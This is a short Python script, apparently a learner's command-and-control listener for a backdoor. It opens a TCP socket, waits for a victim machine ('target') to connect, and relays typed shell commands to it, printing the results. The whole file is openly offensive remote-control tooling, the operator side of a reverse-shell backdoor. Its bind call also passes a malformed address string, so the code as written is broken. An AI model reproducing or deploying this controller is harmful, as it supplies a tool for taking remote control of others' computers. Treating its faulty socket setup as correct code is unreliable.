import socket #tells python you will be communicating over a network
import json

def target_communication():
    while True:
        command_data = input('* Shell~%s: ' % str(ip)) #creates shell input
        reliable_send(command_data)
        if command_data == 'quit':
            break
        else:
            result = reliable_recv() #recieves shell output results
            print(result)

def reliable_send(command_data): #Sends commands to backdoor
    jsondata = json.dumps(command_data)
    target.send(jsondata.encode()) #target is a var created with sock.accept

def reliable_recv(): #Recieves commands from backfoor
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket.socket(IPv4,Tcp)
sock.bind(('192.168.1.19, 5555')) #Host IP and Port to use

print('[+] Listening for incoming connections...')
sock.listen(5) #Max number of connections listening for

target,ip = sock.accept()
print(f'[+] Target connected from {ip}')
target_communication()

